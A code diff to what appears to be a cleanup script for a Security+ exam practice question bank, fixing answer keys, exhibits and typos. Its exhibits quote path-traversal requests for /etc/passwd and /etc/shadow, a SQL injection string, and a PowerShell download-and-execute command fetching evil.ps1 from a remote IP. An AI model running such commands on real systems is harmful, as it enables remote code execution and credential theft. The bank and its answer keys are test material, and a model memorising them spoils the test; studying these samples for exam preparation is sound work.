@@ -124,6 +124,12 @@ KEY_CORRECTIONS = {
     "q0791": (['C'], ['D'],
               'Load balancing keeps the service running through a failure; a backup needs a restore.',
               "Disagreed with the braindump PDF; settled against SY0-701 definitions and published answer discussions."),
+    "q0952": (['B'], ['D'],
+              "The question sets two requirements, quick recovery and low cost. A cold "
+              "site is cheapest but takes days or weeks to bring up; a hot site is quick "
+              "but the most expensive. Only a warm site meets both.",
+              "Reasoning from the question's two requirements; SY0-701 3.4 site "
+              "considerations (warm site = the middle ground on speed and cost)."),
 }
 
 # qid -> reason. Removed from the shipped bank entirely.
@@ -361,13 +367,13 @@ EXHIBITS = {
     "q1029": [("contains the following logs:", "text",
         "GET /image?filename= ../../../etc/passwd\nHost: AcmeInc.web.net\nuseragent: python-request/ 2.27.1\n\n"
         "GET /image?filename= ../../../etc/shadow\nHost: AcmeInc.web.net\nuseragent: python-request/ 2.27.1")],
-    "q1071": [("receives the following output:\nThe engineer", "text",
+    "q1071": [("on the end device and receives the following output:", "text",
         "C:\\User>tracert 10.100.15.20\nTracing route to [internal.resource.org] 10.100.15.20\n"
         "over a maximum of 30 hops:\n"
         "  1  200 ms  200 ms  200 ms  10.20.10.10\n  2    5 ms    3 ms    3 ms  10.20.10.1\n"
         "  3   20 ms   20 ms   10 ms  10.25.10.10\n  4   10 ms    8 ms   10 ms  10.30.110.1\n"
         "  5    5 ms    6 ms    3 ms  10.100.15.20"),
-              ("following output:\nWhich", "text",
+              ("The engineer receives the following output:", "text",
         "C:\\Engineer>tracert 10.100.15.20\nTracing route to [internal.resource.org] 10.100.15.20\n"
         "over a maximum of 30 hops:\n"
         "  1    5 ms    3 ms    3 ms  10.20.10.1\n  2   20 ms   20 ms   10 ms  10.25.10.10\n"
@@ -390,6 +396,10 @@ EXHIBITS = {
         '105.86.13.11 [05/May/2025:01:15:45 -0200] "GET /latestContracts.htm" 404 512')],
     "q1259": [("gets the following results:", "table",
         "Vulnerability | Server location | CVSS score\n1 | Internet | 9.8\n2 | Internal | 4.0\n3 | Internet | 4.0\n4 | Internal | 9.8")],
+    # The PDF runs this command into the question text with its quotes
+    # misplaced; transcribed here as the valid PowerShell it depicts.
+    "q1149": [("reviews the following endpoint log:", "text",
+        'powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://176.30.40.50/evil.ps1\')"')],
 }
 
 
@@ -414,7 +424,7 @@ TEXT_FIXES_READ = {
     'q0344': [('complete their assigned tasks These employees', 'complete their assigned tasks. These employees')],
     'q0348': [('Enable SAML', 'Enable SAML.'), ('Select an IdP', 'Select an IdP.')],
     'q0409': [('Which of me following', 'Which of the following')],
-    'q0430': [('non-standard pat.', 'non-standard port.'), ('upload images the company', 'upload images to the company'), ('server hat was not', 'server that was not'), ('for his security incident', 'for this security incident')],
+    'q0430': [('non-standard pat.', 'non-standard port.'), ('upload images the company', 'upload images to the company'), ('server hat was not', 'server that was not'), ('for his security incident', 'for this security incident'), ('IP on non-standard port.', 'IP on a non-standard port.')],
     'q0432': [('Client-based soon', 'Client-based solution')],
     'q0446': [('query .php script', 'query.php script')],
     'q0528': [('perform a penetration test', 'perform a penetration test.'), ('the right to audit', 'the right to audit.'), ('third-party attestation report', 'third-party attestation report.')],
@@ -425,9 +435,49 @@ TEXT_FIXES_READ = {
     'q0694': [('emails from new vendors', 'emails from new vendors.'), ('invoices be sent as attachments', 'invoices be sent as attachments.'), ('requests from familiar email addresses', 'requests from familiar email addresses.')],
     'q0704': [('identifies that an SMBv1 is enabled', 'identifies that SMBv1 is enabled')],
     'q0706': [('to Internal resources', 'to internal resources')],
+    'q0732': [('Netflow log', 'NetFlow log')],
     'q0742': [('access control vestibule which', 'access control vestibule, which')],
-    'q0887': [('security or a SaaS', 'security of a SaaS'), ('following documentations', 'following documentation')],
+    'q0788': [('Integrate with an SASE platform', 'Integrate with a SASE platform')],
+    'q0839': [('OAUTH', 'OAuth')],
+    'q0848': [('integrating with an SASE platform', 'integrating with a SASE platform')],
+    'q0868': [('dicks links', 'clicks links'), ('stones of famous', 'stories of famous')],
+    'q0887': [('security or a SaaS', 'security of a SaaS'), ('following documentations', 'following documentation'), ('Statement or work', 'Statement of work')],
+    'q0888': [('network ana then', 'network and then'), ('most likely responsive for', 'most likely responsible for')],
+    'q0892': [('UserId – 10 OR 1-1', 'UserId = 10 OR 1=1')],
+    'q0894': [('handbooks and AUP an employee', 'handbooks and AUP, an employee'), ('action tor the company', 'action for the company')],
+    'q0896': [('installation or malicious code', 'installation of malicious code')],
+    'q0897': [('Firewall rues analysis', 'Firewall rules analysis')],
+    'q0919': [('a number of computing instances', 'a number of computing instances.')],
+    'q0953': [('Netflow', 'NetFlow')],
+    'q0956': [('internally-developed', 'internally developed')],
+    'q0985': [('OAUTH', 'OAuth')],
+    'q1031': [('integrating with an SASE platform', 'integrating with a SASE platform')],
+    'q1037': [('activities docs this fall under', 'activities does this fall under')],
+    'q1094': [('Request exception from the system owner.', 'Request an exception from the system owner.')],
+    'q1109': [('protect from exploitation legacy systems at manufacturing sites', 'protect legacy systems at manufacturing sites from exploitation')],
+    'q1123': [('determine it the', 'determine if the'), ('Conduct a phishing campaign', 'Conduct a phishing campaign.')],
+    'q1124': [('Containment, preparation detection', 'Containment, preparation, detection'), ('Preparation detection analysis', 'Preparation, detection, analysis')],
+    'q1127': [('contains a risk to a file', 'contains a link to a file')],
+    'q1131': [('inside the data center', 'inside the data center.'), ('fall-closed mode', 'fail-closed mode'), ('between the appliance and border routers', 'between the appliance and border routers.'), ('the appliance and network device to filter traffic', 'the appliance and network devices to filter traffic.')],
+    'q1134': [('Financial gam', 'Financial gain')],
+    'q1143': [('moves to fail-closed mode', 'moves to fail-closed mode.')],
+    'q1144': [('usually legally binding about outcomes', 'usually legally binding about outcomes.'), ('while an SOW specifies who will engage', 'while an SOW specifies who will engage.'), ('only requires a signature from the service provider', 'only requires a signature from the service provider.')],
+    'q1149': [('powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString (http://176.30.40.50/evil.ps1") Which', 'Which'), ('IP 176.30 40.50?', 'IP 176.30.40.50?')],
+    'q1155': [('security solutions quickly and easily', 'security solutions quickly and easily.'), ('communicate incident response to senior decision-makers', 'communicate incident response to senior decision-makers.')],
+    'q1163': [('enforce 802 1X authentication with device certificates and implement endpoint security checks', 'enforce 802.1X authentication with device certificates and implement endpoint security checks.')],
+    'q1165': [('account and identity management for connected devices', 'account and identity management for connected devices.'), ('share responsibility for the physical network infrastructure', 'share responsibility for the physical network infrastructure.')],
+    'q1167': [('instruct them to avoid suspicious emails', 'instruct them to avoid suspicious emails.')],
+    'q1178': [('an Implicit deny rule', 'an implicit deny rule')],
     'q1188': [('analyst Investigates', 'analyst investigates')],
+    'q1204': [('Partially-known environment', 'Partially known environment')],
+    'q1209': [('latency during fail over', 'latency during failover')],
+    'q1221': [('fully automated fail over', 'fully automated failover')],
+    'q1227': [('Replacing the OSs encryption services', "Replacing the OS's encryption services")],
+    'q1235': [('sorted by source Internet Protocol (IP)', 'sorted by source IP')],
+    'q1257': [('WPA2-enterprise', 'WPA2-Enterprise')],
+    'q1268': [('(Choose two.)', '(Choose three.)')],
+    'q1273': [('Common Vulnerabilities and Exposure (CVE)', 'Common Vulnerabilities and Exposures (CVE)')],
+    'q1279': [("Yearly stakeholder's meeting", 'Yearly stakeholder meeting')],
 }
 
 for _qid, _fixes in TEXT_FIXES_READ.items():
